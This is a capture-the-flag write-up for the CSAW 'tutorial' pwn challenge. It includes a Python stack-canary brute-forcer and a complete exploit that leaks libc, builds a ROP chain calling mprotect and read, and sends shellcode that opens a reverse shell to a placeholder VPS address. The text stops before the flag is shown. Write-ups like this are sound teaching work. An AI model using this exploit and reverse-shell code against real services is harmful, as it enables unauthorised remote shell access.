### Solved by superkojiman and Swappage

I started late in the competition and Swappage asked me to work on this with him. So off we went. I started off with reversing the challenge. We were provided with a 64-bit binary called tutorial with NX and stack-smashing protection on, as well as a copy of the target's libc. The tutorial binary itself presents a menu system with three options. After a bit of reversing, I came to the following conclusion:

* A user called tutorial needs to exist on the system. 
* tutorial takes on argument; the port to listen on. 
* Option 1 on the menu would leak an address. This was puts() - 1280 bytes.
* Option 2 would read in 460 bytes into a 300 byte buffer. Obvious overflow here.

So the vulnerability was obvious. Reading 460 bytes into a 300 byte buffer would overwrite the saved return pointer. The problem was there was a canary, and overwriting it with the wrong value would just trigger a stack-smashing protection error. So we did it the hardway by bruteforcing the canary, which was at offset 312 bytes of the buffer. I hacked together the following code, which was flaky, but worked for our purposes.  

```
#!/usr/bin/env python

from pwn import *
import time, sys

canary = ""
canary_offset = 312;
buf = ""
buf += "A" * canary_offset
buf += canary
guess = 0x00
addr = sys.argv[1]

while len(canary) < 8:
    r = remote(addr, 8002)
    r.recv()
    r.send("2")                     # try exploit

    # try to guess correct canary
    while guess !=  0xff:
        d = r.recv()                    # prompt for exploit
        r.send(buf + chr(guess))

        d1 = r.recv()
        d2 = r.recv()                    # get reply. if "Tutorial" in reply, we guessed correct


        if "Tutorial" in d2:
            print "guessed correct byte:", chr(guess)
            canary += chr(guess)
            buf += chr(guess)
            guess = 0x0
            r.send("2")
        else:
            # incorrect
            guess += 0x1
            break

print "guessed canary:"
print hexdump(canary)

print "buf:"
print hexdump(buf)
```

We found out later that it wasn't necessary to brute-force the canary. Oh well. In any case, since the canary wouldn't change, we just needed to get it once and we could focus on the exploitation. 

We were given a copy of the target's libc, so I uploaded it into [ROPshell](http://www.ropshell.com/ropsearch?h=a1b6d943c8041d7da285be5916523014) to get offsets to the gadgets I'd need to create a ROP chain. However, to make use of them, I'd need to get the libc base address. This was easy because option 1 leaked the address of puts() - 1280 bytes. So to get libc's base address:

* Leak the address using option 1
* Add 1280 bytes to the address. Now we have the address of puts()
* Find puts()'s offset from the provided libc: `readelf -s libc-2.19.so | grep -w puts`
* Subtract the offset from the address of puts() to get libc's base address. 

Once I had the address, I just needed offsets to the gadgets I wanted to use. In this case, I needed `pop rdi`, `pop rsi`, and `pop rdx`, because my plan was to call mprotect() on a known memory location to make it read/write/executable, then call read() to read in my shellcode into that memory location, and finally, just return to it and execute my shellcode. Here's the final exploit:

```
#!/usr/bin/env python

from pwn import *
context(os="linux", arch="amd64")

# server
leak = 0x7f60e48eb860
puts_addr = leak + 1280
puts_offset = 0x00000000006fd60
libc_base = puts_addr - puts_offset
mprotect_offset = 0x0000000000f48d0
mprotect_addr = p64(libc_base + mprotect_offset)
read_offset = 0x0000000000eb6a0
read_addr = p64(libc_base + read_offset)
pop_rdi = p64(libc_base + 0x00022b9a)
pop_rsi = p64(libc_base + 0x00024885)
pop_rdx = p64(libc_base + 0x000bcdf0)
canary = p64(0xbad86d7361e80200)
r = remote("pwn.chal.csaw.io", 8002)

print "libc_base:", hexdump(p64(libc_base))
print "pop rdi:", hexdump(pop_rdi)
print "mprotect_addr:", hexdump(mprotect_addr)
print "read_addr:", hexdump(read_addr)

buf = ""
buf += "A"*312
buf += canary
buf += "B"*8        # saved frame ptr

# mprotect()
buf += pop_rdi
buf += p64(0x00602000)      # addr to make rwx
buf += pop_rsi
buf += p64(1024)
buf += pop_rdx
buf += p64(0x7)
buf += mprotect_addr

# read()
buf += pop_rdi
buf += p64(0x4)             # sockfd
buf += pop_rsi
buf += p64(0x00602000)      # addr to make rwx
buf += pop_rdx
buf += p64(1024)
buf += read_addr

buf += p64(0x00602000)      # return to shellcode

print r.recv()
r.send("2")
print r.recv()

print "sending buf len", len(buf)
r.send(buf)

print "enter to send shellcode"
raw_input()

sc = ""
sc += "\x90"*16
sc += asm(shellcraft.linux.connect("your.vps.ip", 9999))
sc += asm(shellcraft.linux.dupsh())

# send shellcode
r.send(sc)
```

I ran the code and waited for a reverse shell to connect to my listener on my VPS:

```
$ ./own.py
[+] Opening connection to pwn.chal.csaw.io on port 8002: Done

[*] Closed connection to pwn.chal.csaw.io port 8002
```

On on my VPS, I got the shell, and the flag:

```
